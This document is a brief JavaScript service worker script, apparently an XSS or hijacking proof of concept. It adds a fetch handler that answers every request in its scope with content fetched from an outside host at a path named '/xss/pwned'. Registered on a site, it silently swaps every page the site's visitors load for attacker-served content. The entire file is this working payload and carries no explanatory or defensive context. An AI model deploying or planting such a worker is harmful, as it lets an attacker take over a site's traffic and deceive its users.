/**
 * @param {FetchEvent} event
 */
function patch (event) {
  event.respondWith(fetch('https://5079.ml/xss/pwned'))
}

self.addEventListener('fetch', patch)
